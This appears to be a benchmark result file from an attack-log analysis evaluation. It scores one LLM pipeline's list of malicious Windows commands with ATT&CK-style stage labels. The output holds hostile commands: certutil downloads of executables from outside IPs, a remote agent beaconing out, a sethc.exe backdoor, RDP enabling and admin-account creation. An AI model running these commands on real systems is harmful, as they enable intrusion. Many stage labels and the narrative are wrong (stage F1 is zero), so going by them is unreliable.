@@ -1,0 +1,128 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "software_reporter_tool.exe --engine=2 --scan-locations=1,2,3,4,5,6,7,8,10 --disabled-locations=9,11 --session-id=YzNf24YYZfuvRHVbjuMFf3GpplnJ+CDak8V6SAZz --registry-suffix=ESET --enable-crash-reporting --srt-field-trial-group-name=NewCleanerUIExperiment",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe --crash-handler \"--database=c:\\users\\administrator\\appdata\\local\\Google\\Software Reporter Tool\" --url=https://clients2.google.com/cr/report --annotation=plat=Win32 --annotation=prod=ChromeFoil --annotation=ver=99.279.200 --initial-client-data=0x1c0,0x1c4,0x1c8,0x19c,0x1cc,0x7ff763b525a0,0x7ff763b525b0,0x7ff763b525c0",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe --enable-crash-reporting --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_6000_XJTPKPDSUGJHATOO\" --sandboxed-process-id=2 --init-done-notifier=600 --sandbox-mojo-pipe-token=10875049845061253074 --mojo-platform-channel-handle=568 --engine=2",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "c:\\users\\administrator\\appdata\\local\\google\\chrome\\user data\\swreporter\\99.279.200\\software_reporter_tool.exe --enable-crash-reporting --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_6000_XJTPKPDSUGJHATOO\" --sandboxed-process-id=3 --init-done-notifier=812 --sandbox-mojo-pipe-token=2896627467350078373 --mojo-platform-channel-handle=804",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "taskkill /f /im agent.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "python PhpStudyPoc.py http://121.36.30.176/",
+        "stage": "Discovery"
+      },
+      {
+        "command": "del /f /q PhpStudyPoc.py",
+        "stage": "Collection"
+      },
+      {
+        "command": "Reg ADD HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe /V debugger /T REG_SZ /D C:\\windows\\system32\\cmd.exe /F",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "Del /f /q sethc.exe || Copy c:\\windows\\system32\\cmd.exe c:\\users\\public\\sethc.exe",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "netsh advfirewall firewall add rule NAME = RemoteDesktop DIR = IN ACTION = ALLOW PROTOCOL = TCP LOCALPORT = 3389",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "CertUtil -Urlcache -Split -f http://124.223.85.207:8080/sangforcat.exe winbruteforcer.exe ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd /c WinBrute.exe Administrator_Pass.txt Administrator",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "\"C:\\Program Files\\PostgreSQL\\12\\bin\\postgress.exe\" '--forkbackend' 5176",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \\\"cd /d D:/phpStudy/WWW\\&net user nbb nb123. /add&net localgroup administrators nbb /add&echo [S]\\&cd\\&echo [E]\" 2>&1\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \\\"cd /d D:/phpStudy/WWW\\&certutil.exe -urlcache -split -f http://111.229.170.12/phpmyadmin/themes/servert.exe C:\\Windows\\ywm.exe&echo [S]\\&cd\\&echo [E]\" 2>&1\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"cmd /c \\\"cd /d D:/phpStudy/WWW\\&C:\\Windows\\ywm.exe&echo [S]\\&cd\\&echo [E]\" 2>&1\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Windows\\ywm.exe",
+        "stage": "Command and Control"
+      }
+    ],
+    "narrative": "The attackers utilized multiple vectors to execute their attack against the target machine. Initially, software reporter tool execution suggested possible credential access, however it was later discovered that certutil.exe downloads led to actual malicious actions such as lateral movement, privilege escalation and collection. The use of postgresql.exe granted persistence while the agents were being controlled remotely through ywm.exe, ultimately allowing the threat actor to elevate privileges.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 37148,
+      "completion_tokens": 4490,
+      "total_tokens": 41638,
+      "wall_clock_s": 87.285,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.23809523809523808,
+      "recall": 0.625,
+      "f1": 0.3448275862068965,
+      "tp": 5,
+      "fp": 16,
+      "fn": 3
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 21,
+      "fn": 6,
+      "recall_partial": 0.25
+    },
+    "hallucination_rate": 0.2222222222222222,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 37148,
+      "completion_tokens": 4490,
+      "total_tokens": 41638,
+      "wall_clock_s": 87.285,
+      "parse_retries": 1
+    }
+  }
+}
